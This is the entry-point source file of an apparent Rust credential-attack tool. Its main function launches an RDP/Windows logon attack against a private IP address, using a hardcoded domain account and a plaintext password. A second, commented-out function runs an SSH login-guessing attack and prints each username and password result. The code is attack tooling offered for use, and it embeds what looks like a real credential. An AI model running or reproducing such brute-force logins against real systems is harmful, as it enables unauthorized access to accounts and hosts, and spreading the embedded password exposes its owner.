pub mod models;
pub mod functions;
pub mod helpers;
pub mod utils;

use helpers::cli;
use std::env;
use tokio::time::Duration;

use functions::{ssh, winlogon};

fn main() {
    env::set_var("RUST_BACKTRACE", "1");

    cli::banner();

    rdp_attack()
    // ssh_attack();
}

fn rdp_attack() {
    let hostname = String::from("192.168.0.14");
    _ = winlogon::attack(
        hostname,
        Some(Vec::from([String::from("BACKSRV.local\\pbasak")])),
        Some(Vec::from([String::from("Black@1983")])),
    );
}

fn ssh_attack() {
    let hostname = String::from("127.0.0.1");
    let port = 22;

    let responses = ssh::attack(hostname, port, Duration::from_secs(5), None, None);
    for res in responses.iter() {
        println!(
            "username: {} | password: {} | result: {:?}",
            res.0.username, res.0.password, res.1
        );
    }
}
